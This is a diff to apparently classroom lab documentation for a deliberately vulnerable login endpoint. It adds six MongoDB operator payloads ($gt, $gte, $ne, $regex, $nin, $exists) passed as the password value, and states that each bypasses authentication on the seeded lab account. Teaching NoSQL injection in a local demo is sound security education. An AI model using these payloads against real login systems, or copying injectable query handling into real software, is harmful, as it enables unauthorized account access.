@@ -128,27 +128,35 @@ Normal string request:
 }
 ~~~
 
-Brief-shaped object request:
+The local experiment accepts these allowlisted MongoDB operator payloads as the
+password value:
 
 ~~~json
-{
-  "username": "alice",
-  "password": {
-    "gt": ""
-  }
-}
+{"username":"alice","password":{"$gt":""}}
 ~~~
-
-Operator-shaped object request:
 
 ~~~json
-{
-  "username": "alice",
-  "password": {
-    "$gt": ""
-  }
-}
+{"username":"alice","password":{"$gte":""}}
 ~~~
+
+~~~json
+{"username":"alice","password":{"$ne":"not-the-password"}}
+~~~
+
+~~~json
+{"username":"alice","password":{"$regex":".*"}}
+~~~
+
+~~~json
+{"username":"alice","password":{"$nin":["not-the-password"]}}
+~~~
+
+~~~json
+{"username":"alice","password":{"$exists":true}}
+~~~
+
+The request must contain a real JSON object. The local validator allowlists only
+these six operators and bounds their values for a predictable classroom demo.
 
 Successful controlled observation:
 
@@ -167,7 +175,9 @@ Successful controlled observation:
 }
 ~~~
 
-Failed lab observation returns HTTP 401 with the same mode and input metadata, but never returns a password or query object.
+Each operator can authenticate against the seeded lab document without the
+correct scalar password. Failed lab observations return HTTP 401 with the same
+mode and input metadata, but never return a password or query object.
 
 ## 6. Logout
 
